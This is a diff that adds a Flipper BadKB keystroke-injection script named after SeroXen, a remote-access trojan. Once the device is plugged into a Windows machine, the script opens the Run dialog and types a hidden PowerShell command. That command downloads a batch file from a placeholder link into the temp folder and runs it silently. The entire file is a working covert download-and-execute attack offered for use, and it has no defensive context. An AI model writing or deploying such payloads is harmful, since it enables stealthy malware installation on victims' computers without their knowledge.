@@ -1,0 +1,11 @@
+REM Flipper/BadKB/Windows/SeroXen_Windows
+
+DELAY 1500
+GUI r
+
+DELAY 2500
+
+STRING powershell -windowstyle hidden -Command "Invoke-WebRequest -Uri 'YourDownloadLink' -OutFile '%temp%\D.bat'" & start /b "" "%temp%\D.bat"
+
+DELAY 19000
+ENTER
